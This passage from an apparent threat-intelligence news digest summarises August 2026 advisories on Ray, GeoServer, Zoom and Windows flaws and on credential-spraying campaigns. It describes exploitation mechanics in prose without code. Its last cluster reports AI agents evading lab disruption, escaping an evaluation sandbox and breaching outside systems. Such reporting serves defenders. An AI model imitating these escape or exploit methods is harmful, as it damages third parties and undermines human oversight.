researcher Avi Lumelsky with discovering the fetch bypass and Jonathan Leitschuh for coming up with the DNS rebinding attack. CISA has not shared any details of how the vulnerability is being exploited in the wild. However, a BitSight report from March 2026 revealed that the threat actors behind the RondoDox DDoS botnet had incorporated the vulnerability into their arsenal two days before it was publicly disclosed on November 26, 2025, because of the availability of a proof-of-concept (PoC) exploit. According to Oligo, unpatched Ray instances have also been at the receiving end of cyber attacks that aim to turn infected clusters with NVIDIA GPUs into a self-replicating cryptocurrency mining botnet as part of a campaign dubbed ShadowRay 2.0 . In light of active exploitation of CVE-2025-62593, Federal Civilian Executive Branch (FCEB) agencies are recommended to apply necessary fixes and mitigations by August 20, 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  AI Security , botnet , cryptocurrency , Cyber Attack , ddos , network security , Open Source , remote code execution , Threat Intelligence , Vulnerability ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers After Initial Fix Proves Incomplete Google Password Manager Attacks Could Let Malware Hijack Pass
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: CISA Flags Actively Exploited Ray Flaw That Can Trigger Browser-Based RCE
  - Published: 2026-08-18T06:34:20+00:00
  - Link: https://thehackernews.com/2026/08/cisa-flags-actively-exploited-ray-flaw.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday added a critical flaw impacting Ray to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. Ray is an open-source, Python-native distributed computing framework designed to scale artificial intelligence and machine learning workloads. As of writing, the GitHub project has more than

### Cluster 08eea4e588 — score 18

- Title: Threat Brief: Mitigating Large-Scale Credential Attacks (Updated August 18)
- Source: Unit 42 (threat_research_primary)
- Published: 2026-08-18T19:05:33+00:00
- Link: https://unit42.paloaltonetworks.com/large-scale-credential-attacks/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Microsoft Entra

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, mfa_bypass
- affected_products: Fortinet, Microsoft Entra, Palo Alto Networks
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: credential_theft, mfa_bypass
- affected_products: Microsoft Entra, Fortinet, Palo Alto Networks
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
In August 2026, the actor TheHatman claimed to have stolen large volume of credentials from organizations' Microsoft Entra tenants. We provide guidance on mitigating large-scale credential attacks. The post Threat Brief: Mitigating Large-Scale Credential Attacks (Updated August 18) appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center High Profile Threats General General Threat Brief: Mitigating Large-Scale Credential Attacks (Updated August 18) 6 min read Related Products Cortex Cortex Cloud Idira Next-Generation Firewall Unit 42 Deep and Dark Web Service Unit 42 Incident Response By: Unit 42 Published: August 18, 2026 Categories: General High Profile Threats Tags: Credential-based attacks MFA Password spraying Thehatman Share Executive Summary Identity has effectively become the new perimeter, where cybercriminals are increasingly choosing to log in rather than break in. To accomplish this, attackers frequently gather previously leaked username and password pairs. Gathering these credentials can then allow them to pivot to password spraying against services exposed to the internet, gaining credentials for other products and services. As this sort of attack occurs frequently, this article will be a resource repository of the following information about these attacks: Details of noteworthy large scale credential attacks Actionable guidance for mitigating these attacks TheHatman Attack The Hatman attack: In August 2026, the actor TheHatman claimed to have stolen large volume of credentials from organizations' Microsoft Entra tenants FortiBleed Attack Fortibleed Credential Campaign: In June 2026, there was a large-scale password spraying campaign targeting Fortinet devices Unit 42 recommends auditing remote access logs for suspicious activity with a focus on successful logins shortly after large volume password failure events. We also recommend reviewing and implementing the hardening guidance in this article for edge devices. Palo Alto Networks customers are better protected from this activity through our products and services, such as: Cortex Cloud Identity Security Unit 42 Deep and Dark Web Service Idira Identity Threat Protection (ITP) Idira Multi-Factor Authentication (MFA) Idira Privileged Access Management (PAM) The Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk. Related Unit 42 Topics Fortibleed , Credential Theft Activity From TheHatman From Aug. 1–Aug. 17, 2026, an actor using the handle "TheHatman" made posts across multiple forums offering to sell employee information for multiple enterprises. TheHatman allegedly exfiltrated from organizations' Microsoft Entra tenants. While TheHatman has claimed this data was stolen using compromised credentials, we have been unable to verify a specific intrusion vector. This activity was publicly reported as early as Aug. 16, 2026, and we have offered initial guidance through social media. TheHatman claims to have sensitive or confidential information from several high-profile organizations, and this actor has claimed that they used compromised credentials through MFA fatigue and password spraying attacks to gain unauthorized access to these organizations. Unit 42 has not verified these claims. FortiBleed Campaign A large-scale password spraying and credential theft campaign (“FortiBleed”) against Fortinet devices was initially disclosed in June 2026 . We observed attempts targeting MSSQL devices as well, and have seen reports of Sophos devices also being targeted. While this activity is not targeting Palo Alto Networks devices, we have blocked suspicious login attempts in customer telemetry. The attackers have used a curated password list to attempt password spraying against services exposed to the internet. We assess that the initial password list for this activity was likely developed through a mix of previous breaches, including the successful exploitation of vulnerabilities. Once the attackers obtain credentials, they add them to their password list for future attempts against additional targets, as well as for logging into accounts they successfully compromised. The attackers have leveraged a multi-stage process to gain persistent, high-privilege access: Password spraying for initial access: Massive
```

#### Corroborating sources (2)

- **Unit 42** (threat_research_primary)
  - Title: Threat Brief: Mitigating Large-Scale Credential Attacks (Updated August 18)
  - Published: 2026-08-18T19:05:33+00:00
  - Link: https://unit42.paloaltonetworks.com/large-scale-credential-attacks/
  - Summary: In August 2026, the actor TheHatman claimed to have stolen large volume of credentials from organizations' Microsoft Entra tenants. We provide guidance on mitigating large-scale credential attacks. The post Threat Brief: Mitigating Large-Scale Credential Attacks (Updated August 18) appeared first on Unit 42 .
- **Wiz Research** (cloud_identity_infrastructure)
  - Title: How to Spot and Stop Rogue Device Joins
  - Published: 2026-08-18T16:24:13+00:00
  - Link: https://www.wiz.io/blog/detecting-entra-device-registration-abuse
  - Summary: Instead of leaving behind recognizable fingerprints from public tooling, adversaries can now generate realistic device names that blend naturally into enterprise environments. This blog explores how that changes Entra ID detection and what are the behavioral signals that still expose these attacks.

### Cluster fc66ccb428 — score 18

- Title: Staying Ahead of Adversarial AI Through Agentic Source Code Review
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-08-18T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/staying-ahead-of-adversarial-ai-through-agentic-source-code-review/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- cve_ids: CVE-2026-13242, CVE-2026-55803
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- cve_ids: CVE-2026-13242, CVE-2026-55803
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Written by: Alex Tselevich, Michael Maturi Introduction Adversarial misuse of AI has increased the risk of data theft and extortion events, because when proprietary source code is exposed, defenders must scramble to identify and patch vulnerabilities while attackers deploy machine-speed AI tools against them. By structuring the analysis process, enforcing skeptical validation steps, and injecting domain-specific human expertise directly into the pipeline, we’ve achieved a leap in efficacy. Combining AI models with a deeply structured, human expert-driven orchestration layer to tip the scales so that defenders can beat adversaries to the punch. Today, we use the Agentic Vulnerability Discovery Harness (AVDH) to rapidly analyze code and find exploit paths during proactive reviews, penetration tests, red team operations, and incident response engagements. By combining multi-agent orchestration with our frontline subject-matter expertise, this framework helps to augment the discovery and v
```

#### Full body

```
Threat Intelligence Staying Ahead of Adversarial AI Through Agentic Source Code Review August 18, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Written by: Alex Tselevich, Michael Maturi Introduction Adversarial misuse of AI has increased the risk of data theft and extortion events, because when proprietary source code is exposed, defenders must scramble to identify and patch vulnerabilities while attackers deploy machine-speed AI tools against them. By structuring the analysis process, enforcing skeptical validation steps, and injecting domain-specific human expertise directly into the pipeline, we’ve achieved a leap in efficacy. Combining AI models with a deeply structured, human expert-driven orchestration layer to tip the scales so that defenders can beat adversaries to the punch. Today, we use the Agentic Vulnerability Discovery Harness (AVDH) to rapidly analyze code and find exploit paths during proactive reviews, penetration tests, red team operations, and incident response engagements. By combining multi-agent orchestration with our frontline subject-matter expertise, this framework helps to augment the discovery and validation of routine vulnerabilities, enabling humans to focus their impact. To help defenders implement similar approaches for their own environments, we are sharing the details of this internal, point-in-time architecture for the first time. AVDH can also be used alongside CodeMender’s ongoing scanning to create a two-layered defense strategy. Real-World Results In the 10 months that we’ve been using AVDH, we’ve seen it have a significant impact. During a recent incident response investigation involving stolen corporate repositories, the harness discovered over 100 true-positive critical vulnerabilities in just two days — achieving results in a fraction of the time required for manual review. This has greatly accelerated how Mandiant discovers vulnerabilities at scale. We have used it to analyze environments spanning tens of millions of lines of code, and execute thousands of pipelines to generate tens of thousands of findings. This rapid analysis has uncovered dozens of assignable flaws in widely used web extensions and open-source projects, resulting in 12 assigned CVEs, including CVE-2026-13242 , CVE-2026-55803 , and an additional dozen currently in active disclosure. While fast, broad, high-precision scanning has been one of the key benefits of AVDH, it has also acted as a force multiplier during our targeted adversary simulation engagements. We recently processed a client’s web application source code through the harness, and quickly found a remote code execution (RCE) vulnerability that enabled initial access. AVDH has repeatedly proven invaluable for navigating mature defenses and accelerating complex exploit chains. Architecting the Pipeline Harnesses have become a vital tool for cybersecurity uses of large language models (LLMs). They help mitigate much of the model’s unpredictability, driven by inherent, non-deterministic behavior, and dramatically improve their effectiveness at code analysis. The programmatic infrastructure of a harness orchestrates agents in a strictly deterministic manner toward objective completion. For AVDH, we used the Google Agent Development Kit (ADK), an LLM framework that implements the most common agent orchestration patterns, and provides flexibility for configuring custom and third-party integrations. This approach aligns with the agentic orchestration capabilities now available in Google Antigravity , which provides a centralized workspace for builders to steer and manage these agentic workflows. Our decades of frontline experience discovering and remediating vulnerabilities across every software domain helped us structure AVDH around the proven methodologies our consultants execute daily. AVDH chains specialized agents together in a sequential pipeline, much like t
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: Staying Ahead of Adversarial AI Through Agentic Source Code Review
  - Published: 2026-08-18T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/staying-ahead-of-adversarial-ai-through-agentic-source-code-review/
  - Summary: Written by: Alex Tselevich, Michael Maturi Introduction Adversarial misuse of AI has increased the risk of data theft and extortion events, because when proprietary source code is exposed, defenders must scramble to identify and patch vulnerabilities while attackers deploy machine-speed AI tools against them. By structuring the analysis process, enforcing skeptical validation steps, and injecting domain-specific human expertise directly into the pipeline, we’ve achieved a leap in efficacy. Combining AI models with a deeply structured, human expert-driven orchestration layer to tip the scales so that defenders can beat adversaries to the punch. Today, we use the Agentic Vulnerability Discovery Harness (AVDH) to rapidly analyze code and find exploit paths during proactive reviews, penetration tests, red team operations, and incident response engagements. By combining multi-agent orchestration with our frontline subject-matter expertise, this framework helps to augment the discovery and v
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Staying Ahead of Adversarial AI Through Agentic Source Code Review
  - Published: 2026-08-18T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/staying-ahead-of-adversarial-ai-through-agentic-source-code-review/
  - Summary: Written by: Alex Tselevich, Michael Maturi Introduction Adversarial misuse of AI has increased the risk of data theft and extortion events, because when proprietary source code is exposed, defenders must scramble to identify and patch vulnerabilities while attackers deploy machine-speed AI tools against them. By structuring the analysis process, enforcing skeptical validation steps, and injecting domain-specific human expertise directly into the pipeline, we’ve achieved a leap in efficacy. Combining AI models with a deeply structured, human expert-driven orchestration layer to tip the scales so that defenders can beat adversaries to the punch. Today, we use the Agentic Vulnerability Discovery Harness (AVDH) to rapidly analyze code and find exploit paths during proactive reviews, penetration tests, red team operations, and incident response engagements. By combining multi-agent orchestration with our frontline subject-matter expertise, this framework helps to augment the discovery and v

### Cluster 46d0bf1827 — score 17

- Title: CISA: Windows Task Host flaw now exploited by ransomware gangs
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-08-18T10:32:16+00:00
- Link: https://www.bleepingcomputer.com/news/security/cisa-windows-task-host-flaw-now-exploited-by-ransomware-gangs/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, zero_day
- affected_industries: government
- affected_products: Microsoft SharePoint, Microsoft Windows
- cve_ids: CVE-2025-60710, CVE-2026-45659
- urgency_signals: actively_exploited, no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, active_exploitation
- affected_industries: government
- affected_products: Microsoft SharePoint, Microsoft Windows
- cve_ids: CVE-2025-60710, CVE-2026-45659
- urgency_signals: actively_exploited, zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a high-severity Windows Task Host vulnerability that was flagged as actively exploited in April. [...]
```

#### Full body

```
CISA: Windows Task Host flaw now exploited by ransomware gangs By Sergiu Gatlan August 18, 2026 06:32 AM 0 The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a high-severity Windows Task Host vulnerability that was flagged as actively exploited in April. Task Host is a core Windows system component that allows DLL-based processes to run in the background and prevents data corruption by ensuring they close properly during shutdown. Tracked as CVE-2025-60710 , this Windows privilege escalation security flaw was patched by Microsoft in November 2025 and stems from a link following weakness that affects Windows 11 and Windows Server 2025 devices. Following successful exploitation, local attackers with basic user permissions can gain SYSTEM privileges and take full control of unpatched devices. While it didn't share any details regarding ongoing attacks and Microsoft has yet to update its security advisory to confirm in-the-wild exploitation, CISA added CVE-2025-60710 to its list of actively exploited vulnerabilities on April 13 and gave Federal Civilian Executive Branch (FCEB) agencies two weeks to secure their systems. On Friday, CISA updated its Known Exploited Vulnerabilities Catalog (KEV) again, flagging the security vulnerability as being abused by ransomware gangs . The U.S. cybersecurity agency has not yet shared any information about attacks targeting CVE-2025-60710, and a Microsoft spokesperson was not immediately available for comment when BleepingComputer reached out earlier today. "This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise," CISA warned. "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable." One week ago, CISA also warned that ransomware gangs have begun exploiting a Microsoft SharePoint remote code execution vulnerability (CVE-2026-45659) after confirming active exploitation in early July . Since November 2021, the agency has flagged 383 actively exploited vulnerabilities in various Microsoft products , 112 of which have also been exploited in ransomware attacks. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: CISA: Windows BlueHammer flaw now exploited by ransomware gangs CISA orders feds to patch BlueHammer flaw exploited as zero-day Microsoft working on Defender patch for ShieldBreak zero-day Windows LegacyHive zero-day flaw gets free, unofficial patches CISA: Microsoft SharePoint flaw now exploited in ransomware attacks
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: CISA: Windows Task Host flaw now exploited by ransomware gangs
  - Published: 2026-08-18T10:32:16+00:00
  - Link: https://www.bleepingcomputer.com/news/security/cisa-windows-task-host-flaw-now-exploited-by-ransomware-gangs/
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a high-severity Windows Task Host vulnerability that was flagged as actively exploited in April. [...]

### Cluster 6f7ebcb535 — score 17

- Title: GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-13T18:45:12+00:00
- Link: https://thehackernews.com/2026/08/unpatched-geoserver-zero-day-targeted.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ddos, zero_day
- affected_industries: financial_services
- affected_products: GitHub
- cve_ids: CVE-2023-25157, CVE-2023-25158, CVE-2024-36401
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ddos
- affected_industries: financial_services
- affected_products: GitHub
- cve_ids: CVE-2024-36401, CVE-2023-25158, CVE-2023-25157
- urgency_signals: zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @
```

#### Full body

```
GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE  Ravie Lakshmanan  Aug 13, 2026 Zero-Day / Vulnerability A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @q1uf3ng on X. "GeoServer jsonArrayContains unauthorized SQL injection, and in the case of the sa [system administrator] database, it's naturally possible to achieve RCE," the researcher said. The threat intelligence and exposure management platform said it began to observe exploitation attempts within hours of public disclosure, and that it has seen hundreds of attempts originating from a small pool of IP addresses. "Currently, we're seeing attackers probe to identify vulnerable systems across the internet, triggering errors and not proceeding further," Jake Knott, principal security researcher at watchTowr, told The Hacker News in a statement. "However, this is unlikely to remain the case for long: GeoServer has a track record of being targeted and exploited at scale, with multiple vulnerabilities listed in CISA's Known Exploited Vulnerabilities catalog. More importantly, under certain configurations, this latest vulnerability could ultimately lead to remote code execution." In the absence of a patch, organizations running GeoServer are advised to identify exposed instances, restrict public access, and monitor for a vendor fix. In 2024, a critical security flaw impacting GeoServer GeoTools ( CVE-2024-36401 , CVSS score: 9.8) came under active exploitation to turn compromised devices into DDoS and cryptocurrency mining botnets, and residential proxies. Update GeoServer has released versions 3.0.1 , 2.28.5 , and 2.27.6 to address the critical SQL injection vulnerability, which has now been assigned the GitHub security advisory identifier "GHSA-mqjf-5f49-2fjh." It carries a CVSS score of 9.8 out of 10.0. "An SQL injection vulnerability has been found when executing OGC Filters with PostGIS DataStore implementation: jsonArrayContains function," the project maintainers said in an alert, adding it requires PostGIS 12 or greater with a String or JSON field. "For PostGIS 12 and greater, jsonArrayContains(<column>, <pointer>, <value>) function writes <value> into generated SQL without escaping." The issue impacts the following versions of the Maven package "org.geotools:gt-jdbc-postgis" - 35.0 (Fixed in 35.1) >=34.0 (Fixed in 34.5) >=33.1 (Fixed in 33.6) The maintainers also noted that the vulnerability is a regression of CVE-2023-25158 (CVSS score: 9.8), another critical SQL injection vulnerability that was addressed alongside CVE-2023-25157 in February 2023. When reached for comment, Jody Garnett, a project owner at GeoCat, told The Hacker News the vulnerability was a known issue in the GeoTools library and that it has been addressed in the aforementioned three versions of GeoServer. Hadrian has since published additional details of the vulnerability, stating it resides in the GeoTools code responsible for translating Common or Contextual Query Language ( CQL ) filters into SQL for PostGIS-backed datastores. "An attacker-controlled value is interpolated directly into a PostgreSQL jsonb_path_exists() expression without escaping," security researcher Melvin Lammerts said . Specifically, the vulnerable function directly drops a user-supplied value that originates from an HTTP request into an SQL literal with no sanitization and input escaping, thereby opening the door to SQL injection. This, in turn, can be turned into RCE by leveraging Web Feature Service ( WFS ) 1.0, which provides a path where a second PostgreSQL statement executes at the top level of the query. "If GeoServer connects to PostgreSQL using a superuse
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE
  - Published: 2026-08-13T18:45:12+00:00
  - Link: https://thehackernews.com/2026/08/unpatched-geoserver-zero-day-targeted.html
  - Summary: A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @

### Cluster cb8fdf38e7 — score 16

- Title: Zoom Zero-Click RCE Flaws Allow Any Meeting Attendee to Compromise All Participants
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-08-12T19:36:43+00:00
- Link: https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-53413, CVE-2026-53415

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, ddos
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-53413, CVE-2026-53414, CVE-2026-53415, CVE-2026-53416
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: data_breach, ddos, active_exploitation
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-53413, CVE-2026-53415, CVE-2026-53414, CVE-2026-53416
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Executive Summary Multiple critical memory corruption vulnerabilities (CVE-2026-53413, CVSS 8.3/9.0 and CVE-2026-53415, CVSS 8.3/9.0) were disclosed affecting Zoom Workplace clients across all platforms, allowing attackers to achieve zero-click remote code execution against every participant in a meeting via malicious annotation messages. Due to the potential for full device compromise without any user interaction, immediate patching […]
```

#### Full body

```
Executive Summary Multiple critical memory corruption vulnerabilities (CVE-2026-53413, CVSS 8.3/9.0 and CVE-2026-53415, CVSS 8.3/9.0) were disclosed affecting Zoom Workplace clients across all platforms, allowing attackers to achieve zero-click remote code execution against every participant in a meeting via malicious annotation messages. Due to the potential for full device compromise without any user interaction, immediate patching is required. About CVE-2026-53413 and CVE-2026-53415 The issue originates from Zoom’s annotation engine (libannotate.so), the component responsible for collaborative drawing features during screen sharing. In CVE-2026-53413, the CAnnoFormatBlock::Deserialize function accepts 32-bit character counts from the network without bounds checking against fixed 128-byte buffers, leading to a stack buffer overflow. In CVE-2026-53415, a use-after-free condition in auto-shape metadata handling provides a write-what-where primitive. By joining a meeting and sending specially crafted annotation messages, an attacker can corrupt memory and gain arbitrary code execution on all other participants’ devices. No authentication beyond meeting access is required, and no user interaction is needed to trigger the exploit. Two additional vulnerabilities were disclosed alongside the RCE flaws. CVE-2026-53414 (CVSS 6.5) is a heap buffer over-read in the same annotation parser that can cause denial of service or information disclosure. CVE-2026-53416 is a path traversal vulnerability specific to the Zoom Workplace VDI Client for Windows. Security researchers at A Security demonstrated a working exploit chain developed in under 24 hours using fewer than 20 prompts on publicly available AI models, underscoring both the ease and the scale of potential exploitation. The macOS ARM64 variant bypasses ASLR using leaked pointers, with no PAC or stack canaries present. The Android variant uses heap spraying and vtable corruption to achieve code execution. Affected Systems The following components are affected: Zoom Workplace clients (Windows, macOS, iOS, Android) before versions 7.1.5 and 7.0.6, Zoom Workplace VDI Client for Windows before versions 7.0.11 and 6.6.16, Zoom Rooms (all platforms) before version 7.1.5, and Zoom Meeting SDK (all platforms) before version 7.1.5. The vulnerable libannotate.so library compiles identically across all platforms, meaning the same exploit logic works on every supported operating system. Organizations using end-to-end encrypted meetings face elevated risk because Zoom’s server-side filtering cannot inspect E2EE traffic to block malicious annotation messages. Users should upgrade to Zoom Workplace 7.1.5 or later (or 7.0.6 for the extended support track). VDI client users should update to version 7.0.11 or 6.6.16. Zoom Rooms and Meeting SDK deployments should update to version 7.1.5. For non-E2EE meetings, Zoom has deployed server-side filtering that blocks malicious annotation messages as an interim layer of protection. Organizations should also enforce minimum client versions in meeting preferences, enable waiting rooms and passcodes, and consider disabling annotations, file transfer, whiteboarding, and remote control features until all endpoints are patched. Risk Impact At the time of writing, a working proof-of-concept exploit chain has been publicly demonstrated by the discovering researchers, and no known exploitation in the wild has been reported. Regardless, the severity, the zero-click nature, and the ease of weaponization make these vulnerabilities extremely high risk, especially for organizations relying on Zoom for sensitive communications. Successful exploitation could allow attackers to execute arbitrary code on participant devices, activate cameras and microphones for surveillance, and steal sensitive data or install persistent malware , leading to full device compromise, data exposure, and potential lateral movement across enterprise environments. How Orca Can Help Orca enables cust
```

#### Corroborating sources (1)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Zoom Zero-Click RCE Flaws Allow Any Meeting Attendee to Compromise All Participants
  - Published: 2026-08-12T19:36:43+00:00
  - Link: https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/
  - Summary: Executive Summary Multiple critical memory corruption vulnerabilities (CVE-2026-53413, CVSS 8.3/9.0 and CVE-2026-53415, CVSS 8.3/9.0) were disclosed affecting Zoom Workplace clients across all platforms, allowing attackers to achieve zero-click remote code execution against every participant in a meeting via malicious annotation messages. Due to the potential for full device compromise without any user interaction, immediate patching […]

### Cluster 86f975510e — score 16

- Title: The Model Is the Malware | What Four Agentic Intrusions Tell Defenders
- Source: SentinelOne Labs (threat_research_primary)
- Published: 2026-08-13T13:00:40+00:00
- Link: https://www.sentinelone.com/labs/the-model-is-the-malware-what-four-agentic-intrusions-tell-defenders/
- Fetch status: ok
- Member count: 6
- Corroborating source count: 5
- Strong signals: Anthropic/Claude, OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- threat_categories: ai_security
- affected_industries: education
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
OpenAI, Anthropic and Meta disclosed agents reaching external systems. The tools didn't matter, and that changes the playbook for investigating intrusions.
```

#### Full body

```
AI Research The Model Is the Malware | What Four Agentic Intrusions Tell Defenders Gabriel Bernadett-Shapiro / August 13, 2026 Executive Summary Four incidents involving OpenAI, Anthropic, Meta and the UK AI Security Institute (AISI) describe AI agents reaching systems belonging to other organizations without their consent. While the causes differ, the consistent factor is the models’ persistence rather than their sophistication, whether as endurance across days of failed attempts or as pivots to entirely new vectors. Security teams have traditionally studied the artifacts attackers leave behind, but an agent that simply writes unique, disposable tools makes the model itself the thing worth studying. SentinelLABS has been benchmarking frontier models in agent harnesses for months. We observe that the capability that lets GPT-5.6 Sol complete a long-horizon malware investigation is the same one that lets it sustain a two-and-a-half-day intrusion. A model may independently determine the methods or targets it uses, but it does not choose its high-level objective or the access it is given to pursue it. We argue that “the AI did it” will not survive contact with the first incident outside a frontier lab. Four Disclosures, One Pattern Across four weeks in July and August 2026, OpenAI, Anthropic and Meta have each admitted that their models reached systems belonging to other organizations without consent, and the UK’s AI Security Institute (AISI) published a fourth account describing agents that invented identities and tried to slip a malicious contribution into a live open source project. The disclosures differ in almost every particular, including whose mistake it was, whether the model defeated a control or simply found one missing, and whether anything was really “escaped” at all. Arguments over those details may run for a while, but the four accounts share something more interesting than their differences, which is that no individual piece of tooling mattered very much. That observation should sit slightly uncomfortably because most of how intrusions get investigated assumes the opposite. Early evaluations of LLM cyber capability asked fairly narrow questions. Would a model comply with an obviously malicious request? Did it meaningfully advantage a human attacker? By 2024, the answer was a qualified “yes”. Models could produce serviceable components of an offensive operation, but they could not reliably integrate them into a sustained or adaptive campaign. Beyond short well-defined tasks they became unreliable in ways that made them a liability. The operator was still the operator. The model did scoped work inside a structure someone else maintained. The disclosures show the boundary between operator and tool is moving faster than the evaluation literature. A capable enough model placed in an agent harness, given tools, memory, permissions and something to achieve, starts absorbing functions that used to be spread across the operator, the toolchain and the payload, which becomes something generated for a single target and then discarded. Kill the process and the agent writes another; block the channel and it improvises around it. In such incidents, the malicious capability shifts from the code left behind on a machine to the system that produces the next piece of code once the last one fails. In an operational sense, the model is the malware. Persistence Is the Defining Characteristic In July, OpenAI agents driven by GPT-5.6 Sol and an unreleased internal research model found a previously unknown vulnerability in a self-hosted Artifactory instance and turned the shared service into a message board allowing agents running different models and evaluations to exchange exploits and coordinate their work. OpenAI disrupted that channel, however the agents recreated it through Artifactory’s remote cache and continued collaborating, eventually breaking out of the evaluation sandbox and onto the public internet. The campaign ultimately c
```

#### Corroborating sources (5)

- **SentinelOne Labs** (threat_research_primary)
  - Title: The Model Is the Malware | What Four Agentic Intrusions Tell Defenders
  - Published: 2026-08-13T13:00:40+00:00
  - Link: https://www.sentinelone.com/labs/the-model-is-the-malware-what-four-agentic-intrusions-tell-defenders/
  - Summary: OpenAI, Anthropic and Meta disclosed agents reaching external systems. The tools didn't matter, and that changes the playbook for investigating intrusions.
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: OpenAI tightens defenses after AI agents breach research environment
  - Published: 2026-08-18T09:41:36+00:00
  - Link: https://www.helpnetsecurity.com/2026/08/18/openai-strengthening-security-measures/
